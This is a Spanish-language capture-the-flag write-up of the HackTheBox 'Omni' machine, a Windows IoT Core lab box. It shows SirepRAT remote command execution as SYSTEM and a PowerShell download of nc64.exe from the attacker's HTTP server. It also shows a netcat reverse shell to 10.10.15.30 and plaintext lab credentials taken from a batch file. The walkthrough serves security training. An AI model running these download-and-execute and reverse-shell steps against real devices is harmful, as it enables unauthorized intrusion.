@@ -1,0 +1,1378 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/lanz2.png">
+
+<title>HackTheBox - Omni</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Omni | Sh0x blog</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="HackTheBox - Omni" />
+<meta name="author" content="lanz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Máquina IoT nivel fácil. Romperemos protocolos para ejecutar comandos en el sistema, enumerando mucho tendremos credenciales, usaremos portales o.O para ejecutar comandos de nuevo. Jugaremos con la clase PSCredential de PowerShell para obtener las flags." />
+<meta property="og:description" content="Máquina IoT nivel fácil. Romperemos protocolos para ejecutar comandos en el sistema, enumerando mucho tendremos credenciales, usaremos portales o.O para ejecutar comandos de nuevo. Jugaremos con la clase PSCredential de PowerShell para obtener las flags." />
+<link rel="canonical" href="http://localhost:4000/htb/omni" />
+<meta property="og:url" content="http://localhost:4000/htb/omni" />
+<meta property="og:site_name" content="Sh0x blog" />
+<meta property="og:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/omni/banneromni.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-01-09T00:00:00-08:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/omni/banneromni.png" />
+<meta property="twitter:title" content="HackTheBox - Omni" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"lanz"},"dateModified":"2021-01-09T00:00:00-08:00","datePublished":"2021-01-09T00:00:00-08:00","description":"Máquina IoT nivel fácil. Romperemos protocolos para ejecutar comandos en el sistema, enumerando mucho tendremos credenciales, usaremos portales o.O para ejecutar comandos de nuevo. Jugaremos con la clase PSCredential de PowerShell para obtener las flags.","headline":"HackTheBox - Omni","image":"https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/omni/banneromni.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/htb/omni"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/sh0x.png"},"name":"lanz"},"url":"http://localhost:4000/htb/omni"}</script>
+<!-- End Jekyll SEO tag -->
+
+    
+<link href="/assets/css/prism.css" rel="stylesheet">
+
+<link href="/assets/css/theme.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h3>El tiempo a destiempo</h3>
+        <li><a href="/" style="color: #0ecbe4;">Home</a></li>
+        <li><a href="/categories#article">Artículos</a></li>
+        <li><a href="/categories#htb">HackTheBox</a></li>
+        <li><a href="/about" style="color: rgb(89, 89, 89);">Whoami</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Escribe y enter :P"/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/sh0x.png" alt="Sh0x blog">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">HackTheBox - Omni</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+            
+        </div>            
+        <div>
+        Funk <a targ="_blank" class="text-info">Sh0x</a> el 
+        <span class="post-date"><time class="post-date" datetime="2021-01-09">09 Jan 2021</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/omni/banneromni.png" alt="HackTheBox - Omni">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>Máquina IoT nivel fácil. Romperemos protocolos para ejecutar comandos en el sistema, enumerando mucho tendremos credenciales, usaremos portales o.O para ejecutar comandos de nuevo. Jugaremos con la clase PSCredential de PowerShell para obtener las flags.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/omni/omniHTB.png" alt="omniHTB" /></p>
+
+<h2 id="tldr-spanish-writeup">TL;DR (Spanish writeup)</h2>
+
+<p>Holas, bienvenid@ a rompernos la cabeza:</p>
+
+<p>En esta máquina nos encontraremos con un dispositivo <code>IoT Windows</code>, el cual tiene como sistema base <code>IoT Core</code>, que buscando en internet nos encontramos un exploit que nos permitirá ejecutar comandos remotamente, lo usaremos para obtener una reverse Shell. Estando dentro podremos ver las flags de <code>user.txt</code> y <code>root.txt</code>… Listos, hemos terminado :P</p>
+
+<p>Ehhh no, no hemos terminado, las flags están encriptadas, nos romperemos un poco la cabeza buscando y leyendo para al final encontrar un archivo con credenciales que nos abrirá dos puertas en un portal o.O: <code>Windows Device Portal</code>, el cual nos permite gestionar nuestro dispositivo. Nos aprovecharemos de un apartado que ejecuta comandos para entablar una nueva reverse Shell, en primera medida como el usuario <code>administrator</code> para mediante una función de <code>PowerShell</code> ver el contenido de la flag <code>root.txt</code>. Haremos el mismo procedimiento pero con el usuario <code>app</code> para ver el contenido de la flag <code>user.txt</code>. Sin más, démosle candela (:</p>
+
+<blockquote>
+  <p>Escribo para tener mis “notas”, por si algun dia se me olvida todo, leer esto y reencontrarme :) además me enfoco en plasmar mis errores y exitos (por si ves mucho texto).</p>
+</blockquote>
+
+<p>…</p>
+
+<h3 id="fases">Fases</h3>
+
+<p>Tendremos 3 fases. Enumeración, explotación y escalada de privilegios :)</p>
+
+<ol>
+  <li><a href="#enumeracion">Enumeración</a></li>
+  <li><a href="#explotacion">Explotación</a></li>
+  <li><a href="#escalada-de-privilegios">Escalada de privilegios</a></li>
+</ol>
+
+<p>…</p>
+
+<h2 id="enumeracion">Enumeración <a href="#enumeracion">#</a></h2>
+
+<p>Empezaremos realizando un escaneo de puertos sobre la máquina para así saber que servicios está corriendo.</p>
+
+<pre><code class="language-bash">–» nmap -p- --open -v -Pn 10.10.10.204
+</code></pre>
+
+<p>Pero va algo lento, agregando <code>-T</code> va igual, podemos agregar <code>--min-rate</code> y ver si va más rápido. (Sin embargo es importante hacer un escaneo total, sin cambios, así vaya lento, que nos permita ver si obviamos/pasamos algún puerto.</p>
+
+<pre><code class="language-bash">–» nmap -p- --open -v -Pn --min-rate=2000 10.10.10.204 -oG initScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p-</td>
+      <td style="text-align: left">Escanea todos los 65535</td>
+    </tr>
+    <tr>
+      <td>–open</td>
+      <td style="text-align: left">Solo los puertos que están abiertos</td>
+    </tr>
+    <tr>
+      <td>-T</td>
+      <td style="text-align: left">Forma de escanear superrápido, (hace mucho ruido, pero al ser un entorno controlado no nos preocupamos)</td>
+    </tr>
+    <tr>
+      <td>–min-rate</td>
+      <td style="text-align: left">Indica que no queremos hacer peticiones menores al num que pongamos</td>
+    </tr>
+    <tr>
+      <td>-Pn</td>
+      <td style="text-align: left">Evita que realice Host Discovery, como <strong>ping</strong> (P) y el <strong>DNS</strong> (n)</td>
+    </tr>
+    <tr>
+      <td>-v</td>
+      <td style="text-align: left">Permite ver en consola lo que va encontrando</td>
+    </tr>
+    <tr>
+      <td>-oG</td>
+      <td style="text-align: left">Guarda el output en formato grepeable para usar una <a href="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png">función</a> de <a href="https://s4vitar.github.io/">S4vitar</a> que me extrae los puertos en la clipboard</td>
+    </tr>
+  </tbody>
+</table>
+
+<pre><code class="language-bash">–» cat initScan 
+# Nmap 7.80 scan initiated Wed Oct 28 10:58:58 2020 as: nmap -p- --open -v -Pn --min-rate=2000 -oG initScan 10.10.10.204
+# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
+Host: 10.10.10.204 ()   Status: Up
+Host: 10.10.10.204 ()   Ports: 135/open/tcp//msrpc///, 5985/open/tcp//wsman///, 8080/open/tcp//http-proxy///, 29817/open/tcp/////, 29819/open/tcp/////  Ignored State: filtered (65530)
+
+</code></pre>
+
+<p>Obtenemos la siguiente información:</p>
+
+<ul>
+  <li><strong>Puerto 135</strong>: <a href="https://en.wikipedia.org/wiki/Microsoft_RPC">Microsoft Remote Procedure Call</a></li>
+  <li><strong>Puerto 5985</strong>: <a href="https://en.wikipedia.org/wiki/WS-Management">WSMan</a></li>
+  <li><strong>Puerto 8080</strong>: Proxy web</li>
+  <li><strong>Puerto 29817</strong>: Desconocido</li>
+</ul>
+
+<p>Procedemos a nuestro escaneo de versiones y scripts para obtener información más detallada de cada servicio:</p>
+
+<pre><code class="language-bash">–» nmap -p135,5985,8080,29817,29819 -sC -sV -Pn 10.10.10.204 -oN portScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p</td>
+      <td style="text-align: left">Escaneo de los puertos obtenidos</td>
+    </tr>
+    <tr>
+      <td>-sC</td>
+      <td style="text-align: left">Muestra todos los scripts relacionados con el servicio</td>
+    </tr>
+    <tr>
+      <td>-sV</td>
+      <td style="text-align: left">Nos permite ver la versión del servicio</td>
+    </tr>
+    <tr>
+      <td>-oN</td>
+      <td style="text-align: left">Guarda el output en un archivo</td>
+    </tr>
+  </tbody>
+</table>
+
+<pre><code class="language-bash">–» cat portScan 
+# Nmap 7.80 scan initiated Wed Oct 28 11:16:31 2020 as: nmap -p135,5985,8080,29817,29819 -sC -sV -Pn -oN portScan 10.10.10.204
+Nmap scan report for 10.10.10.204
+Host is up (0.19s latency).
+
+PORT      STATE SERVICE  VERSION
+135/tcp   open  msrpc    Microsoft Windows RPC
+5985/tcp  open  upnp     Microsoft IIS httpd
+8080/tcp  open  upnp     Microsoft IIS httpd
+| http-auth: 
+| HTTP/1.1 401 Unauthorized\x0D
+|_  Basic realm=Windows Device Portal
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Site doesn't have a title.
+29817/tcp open  unknown
+29819/tcp open  arcserve ARCserve Discovery
+Service Info: Host: PING; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+</code></pre>
+
+<p>Ok, tenemos cositas varias:</p>
+
+<ul>
+  <li><strong><a href="https://es.wikipedia.org/wiki/Universal_Plug_and_Play">UPNP</a></strong>: Universal Plug and Play (conjunto de protocolos de comunicación que permite a periféricos en la red, encontrar otros dispositivos, establecer conexiones y compartir datos).</li>
+  <li><strong><a href="https://docs.microsoft.com/en-us/windows/iot-core/manage-your-device/deviceportal">Windows Device Portal</a></strong>: Plataforma que permite configurar y mantener un dispositivo remotamente sobre una red local :)</li>
+  <li><strong><a href="https://www.arcserve.com/es/">arcserve</a></strong>: Proveedor en la protección de datos, replicación y recuperación de los mismos.</li>
+  <li>Tenemos sistema operativo Windows, así que el dispositivo IoT esta sobre él.</li>
+</ul>
+
+<p>…</p>
+
+<p>Bueno pues veamos el servidor web.</p>
+
+<h2 id="puerto-8080">Puerto 8080</h2>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/omni/page8080.png" alt="page8080" /></p>
+
+<p>Si buscamos en internet nos indica que las credenciales por default para ingresar a <strong>Windows Device Portal</strong> son:</p>
+
+<ul>
+  <li><strong>username</strong>: Administrator</li>
+  <li><strong>password</strong>: p@ssw0rd</li>
+</ul>
+
+<p>Pero no nos funcionan… Buscando exploits encontramos un proyecto interesante.</p>
+
+<p>…</p>
+
+<h2 id="explotacion">Explotación <a href="#explotacion">#</a></h2>
+
+<ul>
+  <li><a href="https://github.com/SafeBreach-Labs/SirepRAT">Herramienta SirepRAT</a></li>
+  <li><a href="https://www.hackplayers.com/2019/03/exploit-para-ownear-Windows-IoT-Core.html">Articulo en español abordandola</a></li>
+</ul>
+
+<blockquote>
+  <p>Exploit que aprovecha una vulnerabilidad del protocolo de comunicaciones <code>Sirep/WPCon/TShell</code> y que puede permitir a un atacante ejecutar comandos en el sistema. <a href="https://es.wikipedia.org/wiki/Protocolo_de_aplicaciones_inal%C3%A1mbricas">(HackPlayers)</a></p>
+</blockquote>
+
+<ul>
+  <li><a href="https://es.wikipedia.org/wiki/Protocolo_de_aplicaciones_inal%C3%A1mbricas">WPcon (Protocolo de aplicaciones inalámbricas)</a></li>
+</ul>
+
+<blockquote>
+  <p>We broke down the Sirep/WPCon protocol and demonstrated how this protocol exposes a remote command interface for attackers, that include RAT abilities such as get/put arbitrary files on arbitrary locations and obtain system information. <a href="https://github.com/SafeBreach-Labs/SirepRAT">(SirepRAT)</a></p>
+</blockquote>
+
+<p>Podemos iniciar probando que usuario somos y validar su output:</p>
+
+<pre><code class="language-bash">–» python SirepRAT/SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --as_logged_on_user --cmd "C:\Windows\System32\cmd.exe" --args " /c echo "
+&lt;HResultResult | type: 1, payload length: 4, HResult: 0x0&gt;
+&lt;OutputStreamResult | type: 11, payload length: 30, payload peek: 'C:\Data\Users\DefaultAccount'&gt;
+&lt;ErrorStreamResult | type: 12, payload length: 4, payload peek: ''&gt;
+</code></pre>
+
+<p>Perfecto, tenemos ejecución de comandos. En la fila <code>&lt;OutputStreamResult&gt;</code> vemos nuestra respuesta: <code>'C:\Data\Users\DefaultAccount'</code>.</p>
+
+<p>El programa tiene la opción de ejecutar los comandos como SYSTEM (simplemente quitamos <code>--as_logged_on_user</code>).</p>
+
+<pre><code class="language-bash">–» python SirepRAT/SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c echo "
+&lt;HResultResult | type: 1, payload length: 4, HResult: 0x0&gt;
+&lt;OutputStreamResult | type: 11, payload length: 22, payload peek: 'C:\Data\Users\System'&gt;
+&lt;ErrorStreamResult | type: 12, payload length: 4, payload peek: ''&gt;
+</code></pre>
+
+<p>¿En qué directorio estamos parados?</p>
+
+<pre><code class="language-powershell">–» python SirepRAT/SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c echo %cd%" --v
+---------
+C:\windows\system32
+
+---------
+&lt;HResultResult | type: 1, payload length: 4, HResult: 0x0&gt;
+&lt;OutputStreamResult | type: 11, payload length: 21, payload peek: 'C:\windows\system32'&gt;
+&lt;ErrorStreamResult | type: 12, payload length: 4, payload peek: ''&gt;
+</code></pre>
+
+<ul>
+  <li>Con <code>--v</code> hacemos el típico <strong>verbose</strong>, nos sirve si queremos hacer <code>dir</code> para ver todo el output:</li>
+</ul>
+
+<pre><code class="language-powershell">–» python SirepRAT/SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c dir ..\..\"" --v
+---------
+ Volume in drive C is MainOS
+ Volume Serial Number is 3C37-C677
+
+ Directory of C:\
+
+07/20/2020  02:36 AM    &lt;DIR&gt;          $Reconfig$
+10/26/2018  11:35 PM    &lt;JUNCTION&gt;     Data [\??\Volume{ac55f613-7018-45c7-b1e9-7ddda60262fd}\]
+10/26/2018  11:37 PM    &lt;DIR&gt;          Program Files
+10/26/2018  11:38 PM    &lt;DIR&gt;          PROGRAMS
+10/26/2018  11:37 PM    &lt;DIR&gt;          SystemData
+10/26/2018  11:37 PM    &lt;DIR&gt;          Users
+07/03/2020  10:35 PM    &lt;DIR&gt;          Windows
+               0 File(s)              0 bytes
+               7 Dir(s)     584,499,200 bytes free
+
+---------
+&lt;HResultResult | type: 1, payload length: 4, HResult: 0x0&gt;
+&lt;OutputStreamResult | type: 11, payload length: 584, payload peek: ' Volume in drive C is MainOS Volume Serial Numbe'&gt;
+&lt;ErrorStreamResult | type: 12, payload length: 4, payload peek: ''&gt;
+</code></pre>
+
+<p>Vemos la estructura raíz del sistema… Perfecto, intentemos subir el binario <strong>netcat</strong> para entablarnos una reverse Shell y estar más cómodos:</p>
+
+<p>Recientemente vimos una ruta hacia <code>C:\Data\Users\DefaultAccount</code>, podemos usarla para subir el binario. Primero montamos un servidor web con Python donde este <code>nc.exe</code>:</p>
+
+<pre><code class="language-bash">–» python3 -m http.server
+</code></pre>
+
+<pre><code class="language-bash">–» python SirepRAT/SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c powershell IWR -uri http://10.10.15.30:8000/nc.exe -OutFile C:\Data\Users\DefaultAccount\nc.exe"
+</code></pre>
+
+<p>Validamos:</p>
+
+<pre><code class="language-powershell">–» python SirepRAT/SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c dir C:\Data\Users\DefaultAccount" --v
+---------
+ Volume in drive C is MainOS
+ Volume Serial Number is 3C37-C677
+
+ Directory of C:\Data\Users\DefaultAccount
+
+10/29/2020  09:25 PM    &lt;DIR&gt;          .
+10/29/2020  09:25 PM    &lt;DIR&gt;          ..
+07/03/2020  11:22 PM    &lt;DIR&gt;          3D Objects
+07/03/2020  11:22 PM    &lt;DIR&gt;          Documents
+07/03/2020  11:22 PM    &lt;DIR&gt;          Downloads
+07/03/2020  11:22 PM    &lt;DIR&gt;          Favorites
+07/03/2020  11:22 PM    &lt;DIR&gt;          Music
+10/29/2020  10:21 PM            45,272 nc.exe
+07/03/2020  11:22 PM    &lt;DIR&gt;          Pictures
+07/03/2020  11:22 PM    &lt;DIR&gt;          Videos
+               1 File(s)         45,272 bytes
+               9 Dir(s)   4,692,344,832 bytes free
+
+---------
+&lt;HResultResult | type: 1, payload length: 4, HResult: 0x0&gt;
+&lt;OutputStreamResult | type: 11, payload length: 688, payload peek: ' Volume in drive C is MainOS Volume Serial Numbe'&gt;
+&lt;ErrorStreamResult | type: 12, payload length: 4, payload peek: ''&gt;
+</code></pre>
+
+<p>Nos ponemos en escucha (<code>nc -nvlp 4433</code>) y ejecutamos:</p>
+
+<pre><code class="language-bash">–» python SirepRAT/SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c C:\Data\Users\DefaultAccount\nc.exe 10.10.15.30 4433 -e cmd.exe" --v
+</code></pre>
+
+<p>Acá tenemos problemas con la versión de <code>nc.exe</code>, así que descargaremos las 2 y probaremos con las 2… Volvemos a subir la de 32 Bits, pero no funciona, probemos con la de 64 :)</p>
+
+<pre><code class="language-bash">–» python SirepRAT/SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c powershell IWR -uri http://10.10.15.30:8000/nc64.exe -OutFile C:\Data\Users\DefaultAccount\nc64.exe"
+</code></pre>
+
+<p>Validemos de una:</p>
+
+<pre><code class="language-bash">–» python SirepRAT/SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args " /c C:\Data\Users\DefaultAccount\nc64.exe 10.10.15.30 4433 -e cmd.exe" --v
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/omni/bashrevshell1OK.png" alt="bashrevshell1OK" /></p>
+
+<p>Perfecto, tamos dentro :) veamos que más nos encontramos.</p>
+
+<p>…</p>
+
+<h2 id="escalada-de-privilegios">Escalada de privilegios <a href="#escalada-de-privilegios">#</a></h2>
+
+<p>Encontramos varios archivos, podemos ver <code>root.txt</code> y <code>user.txt</code>, pero están encriptados mediante la clase <code>System.Management.Automation.PSCredential</code>.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/omni/rvs1flagsencrypted.png" alt="rvs1flagsencrypted" /></p>
+
+<h4 id="usertxt">user.txt</h4>
+
+<pre><code class="language-xml">&lt;Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04"&gt;
+  &lt;Obj RefId="0"&gt;
+    &lt;TN RefId="0"&gt;
+      &lt;T&gt;System.Management.Automation.PSCredential&lt;/T&gt;
+      &lt;T&gt;System.Object&lt;/T&gt;
+    &lt;/TN&gt;
+    &lt;ToString&gt;System.Management.Automation.PSCredential&lt;/ToString&gt;
+    &lt;Props&gt;
+      &lt;S N="UserName"&gt;flag&lt;/S&gt;
+      &lt;SS N="Password"&gt;01000000d08c9ddf0115d1118c7a00c04fc297eb010000009e131d78fe272140835db3caa288536400000000020000000000106600000001000020000000ca1d29ad4939e04e514d26b9706a29aa403cc131a863dc57d7d69ef398e0731a000000000e8000000002000020000000eec9b13a75b6fd2ea6fd955909f9927dc2e77d41b19adde3951ff936d4a68ed750000000c6cb131e1a37a21b8eef7c34c053d034a3bf86efebefd8ff075f4e1f8cc00ec156fe26b4303047cee7764912eb6f85ee34a386293e78226a766a0e5d7b745a84b8f839dacee4fe6ffb6bb1cb53146c6340000000e3a43dfe678e3c6fc196e434106f1207e25c3b3b0ea37bd9e779cdd92bd44be23aaea507b6cf2b614c7c2e71d211990af0986d008a36c133c36f4da2f9406ae7&lt;/SS&gt;
+    &lt;/Props&gt;
+  &lt;/Obj&gt;
+&lt;/Objs&gt;
+</code></pre>
+
+<p>Buscando y leyendo durante bastante tiempo, intentando solucionar problemas, desencriptar y quebrándome la cabeza… Nelson, no pudimos así que me sentí superperdido sin saber que hacer y me fui para el foro.</p>
+
+<p>Curiosamente muchas personas también se habían estancado ahí, los demás indicaban que era necesario encontrar otro archivo en el que van a haber cosas bonitas… Leyendo como podemos apoyarnos de <code>PowerShell</code> para buscar objetos rápidamente encontré esta manera:</p>
+
+<ul>
+  <li><a href="https://stackoverflow.com/questions/8677628/recursive-file-search-using-powershell">Buscar de manera recursiva PowerShell</a>.</li>
+  <li><a href="https://devblogs.microsoft.com/scripting/use-windows-powershell-to-search-for-files/">… y exclusiva</a>.</li>
+</ul>
+
+<pre><code class="language-powershell"># Guardamos el año en una variable
+$date = Get-Date -Year 2019
+# Le indicamos que busque en la ruta actual (**.**), donde nos muestre los archivos ocultos (**-force**), entre y busque en cada carpeta (**-recurse**) y tenga una fecha mayor o igual a la variable que guardamos
+Get-ChildItem -Path . -force | Where-Object { $_.LastWriteTime -ge $date }
+</code></pre>
+
+<p>Con esto estuve rondando algunas carpetas, hasta que busque en la misma relacionada con <code>PowerShell</code>, situada en: <code>C:\Program Files\WindowsPowerShell</code>.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/omni/rvs1rbatfound.png" alt="rvs1rbatfound" /></p>
+
+<p>Encontramos este archivo llamado <code>r.bat</code>, que quieras o no parece sospechoso, por la fecha y por su nombre, veamos si encontramos algo ahí.</p>
+
+<pre><code class="language-powershell">PS C:\Program Files&gt; type "C:\Program Files\WindowsPowerShell\Modules\PackageManagement\r.bat"
+@echo off
+
+:LOOP
+
+for /F "skip=6" %%i in ('net localgroup "administrators"') do net localgroup "administrators" %%i /delete
+
+net user app mesh5143
+net user administrator _1nt3rn37ofTh1nGz
+
+ping -n 3 127.0.0.1
+
+cls
+
+GOTO :LOOP
+
+:EXIT
+PS C:\Program Files&gt;
+</code></pre>
+
+<p>Vemos los dos usuarios a los que les encontramos sus respectivas flags: <strong>administrator</strong> y <strong>app</strong>. Con lo que parecen ser contraseñas, podemos probar mediante el portal que nos encontramos en el puerto 8080 y con WinRM.</p>
+
+<ul>
+  <li>app : mesh5143</li>
+  <li>administrator : _1nt3rn37ofTh1nGz</li>
+</ul>
+
+<p>Mediante <code>WinRM</code> no podemos acceder, probando con el portal y con las credenciales de administrador, logramos entrar:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/omni/pageportalinsideadmin.png" alt="pageportalinsideadmin" /></p>
+
+<p>Dandole una pasada vemos un apartado donde podemos ingresar comandos en el sistema. Al estar como administrador, podemos ejecutar las instrucciones como él.</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/omni/pageportalcommand.png" alt="pageportalcommand" /></p>
+
+<p><strong>Veamos la diferencia entre SYSTEM y ADMINISTRATOR:</strong></p>
+
+<pre><code class="language-powershell"># Sesión que tenemos actualmente.
+C:\Data\Users\app&gt;echo %userprofile%
+C:\Data\Users\System
+
+# Arbol de archivos en el que tenemos `hardening.txt`, al cual no podemos acceder.
+C:\Data\Users\app&gt;dir
+ Volume in drive C is MainOS
+ Volume Serial Number is 3C37-C677
+
+ Directory of C:\Data\Users\app
+
+07/04/2020  08:53 PM    &lt;DIR&gt;          .
+07/04/2020  08:53 PM    &lt;DIR&gt;          ..
+07/04/2020  06:28 PM    &lt;DIR&gt;          3D Objects
+07/04/2020  06:28 PM    &lt;DIR&gt;          Documents
+07/04/2020  06:28 PM    &lt;DIR&gt;          Downloads
+07/04/2020  06:28 PM    &lt;DIR&gt;          Favorites
+07/04/2020  07:20 PM               344 hardening.txt
+07/04/2020  07:14 PM             1,858 iot-admin.xml
+07/04/2020  06:28 PM    &lt;DIR&gt;          Music
+07/04/2020  06:28 PM    &lt;DIR&gt;          Pictures
+07/04/2020  08:53 PM             1,958 user.txt
+07/04/2020  06:28 PM    &lt;DIR&gt;          Videos
+               3 File(s)          4,160 bytes
+               9 Dir(s)   4,690,558,976 bytes free
+
+C:\Data\Users\app&gt;type hardening.txt
+type hardening.txt
+Access is denied.
+</code></pre>
+
+<p>Ahora juguemos con el portal:</p>
+
+<pre><code class="language-powershell">Command&gt; echo %userprofile%
+C:\Data\Users\administrator 
+</code></pre>
+
+<p>Perfecto, pues intentemos obtener una reverse Shell mediante el portal:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/omni/rvs2portalhardone.png" alt="rvs2portalhardone" /></p>
+
+<p>Listos, tamos como <strong>administrator</strong>, veamos si ahora si podemos jugar con las flags :P</p>
+
+<p>De las búsquedas y lecturas que ya había hecho, encontré este comando que toma la estructura del archivo y la convierte en un objeto del sistema, del cual podemos ver el usuario y contraseña que tenga asignada:</p>
+
+<pre><code class="language-powershell">$credential = Import-CliXml -Path  &lt;PathToXml&gt;\MyCredential.xml
+</code></pre>
+
+<ul>
+  <li><a href="https://mcpmag.com/articles/2017/07/20/save-and-read-sensitive-data-with-powershell.aspx">Save and read sensitive data with PowerShell</a></li>
+</ul>
+
+<p>Entonces podemos usar esto para validar:</p>
+
+<ul>
+  <li>user.txt</li>
+  <li>root.txt</li>
+  <li>iot-admin.xml</li>
+</ul>
+
+<p>También de la lectura previa entendí que si no somos el propietario del archivo, lo más probable es que obtengamos algún tipo de error, en nuestro caso al intentar jugar con <code>user.txt</code> y <code>iot-admin.xml</code>, obtenemos:</p>
+
+<pre><code class="language-powershell">PS c:\Data\Users\app&gt; $credential = Import-CliXml -Path c:..user.txt
+Import-CliXml : Error occurred during a cryptographic operation.
+At line:1 char:15
++ $credential = Import-CliXml -Path c:..user.txt
++               ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [Import-Clixml], Cryptographic 
+   Exception
+    + FullyQualifiedErrorId : System.Security.Cryptography.CryptographicExcept 
+   ion,Microsoft.PowerShell.Commands.ImportClixmlCommand
+</code></pre>
+
